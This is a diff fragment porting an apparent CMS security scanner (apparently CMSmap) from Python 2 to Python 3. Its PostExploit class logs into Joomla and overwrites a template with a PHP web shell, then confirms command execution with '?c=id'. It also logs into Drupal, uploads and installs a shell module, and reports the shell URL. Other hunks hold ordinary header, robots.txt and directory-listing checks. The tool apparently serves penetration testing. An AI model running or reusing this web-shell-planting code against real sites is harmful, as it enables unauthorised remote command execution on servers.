-                htmltext = opener.open(self.url+"/administrator/index.php?option=com_templates&task=source.edit&id="+base64.b64encode(tempPage+":index.php")).read()
+                htmltext = opener.open(self.url+"/administrator/index.php?option=com_templates&task=source.edit&id="+base64.b64encode(tempPage+":index.php")).read().decode()
                 template = re.findall(re.compile('template "(.+?)"\.</legend>'),htmltext)
                 if verbose : msg = "Joomla template Found: "+ template[0]; report.verbose(msg)
                 # Gets phpCode and Token
@@ -1563,11 +1575,11 @@ class PostExploit:
                 data = urllib.parse.urlencode(query_args)
                 # Send request
                 msg = "Updating a new template with a PHP shell on the target website ..."; report.verbose(msg)
-                htmltext = opener.open(self.url+"/administrator/index.php?option=com_templates&layout=edit",data).read()
+                htmltext = opener.open(self.url+"/administrator/index.php?option=com_templates&layout=edit",data).read().decode()
                 
                 if not re.search('Error',htmltext,re.IGNORECASE):
                 # If not error, then find shell
-                    htmltext = urllib.request.urlopen(self.url+"/templates/"+template[0]+"/"+"index.php?c=id").read()
+                    htmltext = urllib.request.urlopen(self.url+"/templates/"+template[0]+"/"+"index.php?c=id").read().decode()
                     if re.search('uid=\d+\(.+?\) gid=\d+\(.+?\) groups=\d+\(.+?\)', htmltext) :
                         # Front end template
                         msg = "Web shell Found: " + self.url+"/templates/"+template[0]+"/"+"index.php?c=id"; report.high(msg)
@@ -1576,7 +1588,7 @@ class PostExploit:
                         # shell found then exit
                         sys.exit()
                     else:
-                        htmltext = urllib.request.urlopen(self.url+"/administrator/templates/"+template[0]+"/"+"index.php?c=id").read()
+                        htmltext = urllib.request.urlopen(self.url+"/administrator/templates/"+template[0]+"/"+"index.php?c=id").read().decode()
                         # Back end template
                         if re.search('uid=\d+\(.+?\) gid=\d+\(.+?\) groups=\d+\(.+?\)', htmltext) :
                             msg = "Web shell Found: " + self.url+"/administrator/templates/"+template[0]+"/"+"index.php?c=id"; report.high(msg)
@@ -1609,17 +1621,17 @@ class PostExploit:
             # Logging into the website with username and password
             self.query_args_login = {"name": user ,"pass": password, "form_id":"user_login"}
             data = urllib.parse.urlencode(self.query_args_login)
-            htmltext = opener.open(self.url+self.drulogin, data).read()
+            htmltext = opener.open(self.url+self.drulogin, data).read().decode()
             # Get Token and Build id in Upload Page
-            htmltext = opener.open(self.url+self.druInstall).read()
+            htmltext = opener.open(self.url+self.druInstall).read().decode()
             self.token = re.findall(re.compile('<input type="hidden" name="form_token" value="(.+?)"'),htmltext)
             self.form_buildid = re.findall(re.compile('<input type="hidden" name="form_build_id" value="(.+?)"'),htmltext)
             # Upload Module
             self.params = { "files[project_upload]" : open("shell/dru-shell.zip", "rb") , "form_build_id":self.form_buildid[0],"form_token":self.token[0],"form_id":"update_manager_install_form","op":"Install"}
-            htmltext = opener.open(self.url+self.druInstall, self.params).read()
+            htmltext = opener.open(self.url+self.druInstall, self.params).read().decode()
             self.dru_id = re.findall(re.compile('id=(.+?)&'),htmltext)
             try:
-                htmltext = opener.open(self.url+"/authorize.php?batch=1&op=start&id="+self.dru_id[0]).read()
+                htmltext = opener.open(self.url+"/authorize.php?batch=1&op=start&id="+self.dru_id[0]).read().decode()
                 if re.search("Installing drushell",htmltext):
                     msg = "CMSmap Drupal Shell Module Installed"; report.high(msg)
                     msg = "Web Shell: "+self.url+"/sites/all/modules/drushell/shell.php"; report.high(msg)
@@ -1673,7 +1685,7 @@ class GenericChecks:
         self.relPath = relPath
         try:
             req = urllib.request.Request(self.url+self.relPath,None,self.headers)
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             dirList = re.search("<title>Index of", htmltext,re.IGNORECASE)
             if dirList: 
                 msg = self.url+self.relPath ; report.low(msg)
@@ -1688,7 +1700,7 @@ class GenericChecks:
             req = urllib.request.Request(self.url,None, self.headers)
             noRedirOpener = urllib.request.build_opener(NoRedirects())
             try:
-                htmltext = noRedirOpener.open(req).read()
+                htmltext = noRedirOpener.open(req).read().decode()
                 msg = "Website Not in HTTPS: "+self.url
                 report.medium(msg)
             except urllib.error.HTTPError as e:
@@ -1703,21 +1715,21 @@ class GenericChecks:
         msg = "Checking Headers ..."; report.verbose(msg)
         try:
             response = urllib.request.urlopen(req)
-            if response.info().getheader('Server'):
-                msg = "Server: "+response.info().getheader('Server'); report.info(msg)
-            if response.info().getheader('X-Powered-By'):
-                msg = "X-Powered-By: "+response.info().getheader('X-Powered-By'); report.info(msg)
-            if response.info().getheader('X-Generator'):
-                msg = "X-Generator: "+response.info().getheader('X-Generator'); report.low(msg)
-            if response.info().getheader('x-xss-protection') == '0':
+            if response.info().get('Server'):
+                msg = "Server: "+response.info().get('Server'); report.info(msg)
+            if response.info().get('X-Powered-By'):
+                msg = "X-Powered-By: "+response.info().get('X-Powered-By'); report.info(msg)
+            if response.info().get('X-Generator'):
+                msg = "X-Generator: "+response.info().get('X-Generator'); report.low(msg)
+            if response.info().get('x-xss-protection') == '0':
                 msg = "X-XSS-Protection Disabled"; report.high(msg)
-            if not response.info().getheader('x-frame-options') or (response.info().getheader('x-frame-options').lower() != 'sameorigin' or 'deny'):
+            if not response.info().get('x-frame-options') or (response.info().get('x-frame-options').lower() != 'sameorigin' or 'deny'):
                 msg = "X-Frame-Options: Not Enforced"; report.low(msg)
-            if not response.info().getheader('strict-transport-security'):
+            if not response.info().get('strict-transport-security'):
                 msg = "Strict-Transport-Security: Not Enforced"; report.info(msg)
-            if not response.info().getheader('x-content-security-policy'):
+            if not response.info().get('x-content-security-policy'):
                 msg = "X-Content-Security-Policy: Not Enforced"; report.info(msg)
-            if not response.info().getheader('x-content-type-options'):
+            if not response.info().get('x-content-type-options'):
                 msg = "X-Content-Type-Options: Not Enforced"; report.info(msg)
         except urllib.error.HTTPError as e:
             #print e.code
@@ -1727,7 +1739,7 @@ class GenericChecks:
         self.relPath = relPath
         try:
             req = urllib.request.Request(self.url+self.relPath,None,self.headers)
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             autoComp = re.search("autocomplete=\"off\"", htmltext,re.IGNORECASE)
             if not autoComp : 
                 msg = "Autocomplete Off Not Found: "+self.url+self.relPath
@@ -1738,7 +1750,7 @@ class GenericChecks:
     def RobotsTXT(self):
         req = urllib.request.Request(self.url+"/robots.txt",None,self.headers)
         try:
-            htmltext = urllib.request.urlopen(req).read()
+            htmltext = urllib.request.urlopen(req).read().decode()
             if len(htmltext) not in self.notValidLen:
                 msg = "Robots.txt Found: " +self.url+"/robots.txt"; report.low(msg)
         except urllib.error.HTTPError as e:
@@ -1750,7 +1762,7 @@ class GenericChecks:
             req = urllib.request.Request(self.url+"/N0WayThatYouAreHere"+time.strftime('%d%m%H%M%S')+exten,None, self.headers)
             noRedirOpener = urllib.request.build_opener(NoRedirects())
             try:
-                htmltext = noRedirOpener.open(req).read()
+                htmltext = noRedirOpener.open(req).read().decode()
                 self.notValidLen.append(len(htmltext))
             except urllib.error.HTTPError as e:
                 self.notValidLen.append(len(e.read()))
@@ -1758,7 +1770,7 @@ class GenericChecks:
         for exten in self.commExt:
             req = urllib.request.Request(self.url+"/N0WayThatYouAreHere"+time.strftime('%d%m%H%M%S')+exten,None, self.headers)
             try:
-                htmltext = urllib.request.urlopen(req).read() 
+                htmltext = urllib.request.urlopen(req).read().decode() 
                 self.notValidLen.append(len(htmltext))
             except urllib.error.HTTPError as e:
                 #print e.code
